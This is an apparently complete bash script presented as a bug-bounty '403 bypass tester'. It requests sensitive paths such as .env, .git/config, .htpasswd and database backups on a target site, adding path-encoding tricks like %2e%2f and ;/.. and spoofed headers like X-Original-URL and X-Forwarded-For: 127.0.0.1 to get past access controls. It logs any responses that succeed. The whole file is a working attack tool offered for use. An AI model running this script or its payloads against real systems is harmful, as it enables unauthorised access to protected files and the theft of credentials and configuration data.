#!/bin/bash

# Bug Bounty 403 Bypass Tester - Extended Wordlist
# Author: Cyber_pent
# Usage: ./403bypass.sh https://target.com

TARGET=$1

# Extended wordlist of sensitive files & dirs
WORDLIST=(
  "config.php" "config.inc.php" "configuration.php" ".env" ".git/config"
  "index.php" "index.html" "home.php" "default.aspx"
  "admin" "administrator" "admin.php" "admin/login.php"
  "login" "login.php" "user/login" "auth" "authenticate" "account"
  "portal" "dashboard" "backend" "cpanel" "plesk"
  "server-status" "server-info"
  "test" "test.php" "debug" "debug.php"
  "phpinfo.php" "info.php"
  "backup" "backup.zip" "backup.sql" "db.sql" "database.sql"
  "old" "old.php" "temp" "tmp" "logs" "error.log" "debug.log"
  ".htaccess" ".htpasswd"
)

# Common 403 bypass payloads
BYPASS_PAYLOADS=(
  "" "/" "/." "/.."
  "." ".." "%2e" "%2e%2f" "%2e%2e%2f"
  "%20" "%09" "%00"
  "//" "??" ";/.."
  "?id=1" "?debug=true" "?test=1"
)

# Header-based bypass payloads
HEADERS=(
  "X-Original-URL: /"
  "X-Rewrite-URL: /"
  "X-Custom-IP-Authorization: 127.0.0.1"
  "X-Forwarded-For: 127.0.0.1"
  "X-Forwarded-Host: 127.0.0.1"
  "X-Host: 127.0.0.1"
  "X-Forwarded-Scheme: http"
  "X-Originating-IP: 127.0.0.1"
  "X-Remote-IP: 127.0.0.1"
  "X-Client-IP: 127.0.0.1"
)

# ---------- FUNCTIONS ----------
test_url() {
  local url=$1
  local resp=$(curl -sk -i -o /tmp/curlbody.txt -w "%{http_code} %{size_download}" "$url")
  local code=$(echo $resp | awk '{print $1}')
  local size=$(echo $resp | awk '{print $2}')
  echo "[+] $url -> Code:$code Size:$size"

  # Log interesting responses
  if [[ "$code" == "200" || "$code" == "301" || "$code" == "302" || "$code" == "400" ]]; then
    echo -e "\n--- $url [Code $code] ---" >> results.log
    grep -i "Location:" /tmp/curlbody.txt >> results.log
    head -n 20 /tmp/curlbody.txt >> results.log
    echo -e "\n" >> results.log
  fi

  sleep 0.2   # 5 requests/sec (safe  policy)
}

test_headers() {
  local url=$1
  for header in "${HEADERS[@]}"; do
    echo "[+] Testing Header: $header"
    curl -sk -o /dev/null -w "Code:%{http_code} Size:%{size_download}\n" -H "$header" "$url"
    sleep 0.2
  done
}

# ---------- MAIN ----------
if [[ -z "$TARGET" ]]; then
  echo "Usage: $0 <target-url>"
  echo "Example: $0 https://example.com"
  exit 1
fi

for word in "${WORDLIST[@]}"; do
  for payload in "${BYPASS_PAYLOADS[@]}"; do
    test_url "${TARGET}/${word}${payload}"
  done
  test_headers "${TARGET}/${word}"
done
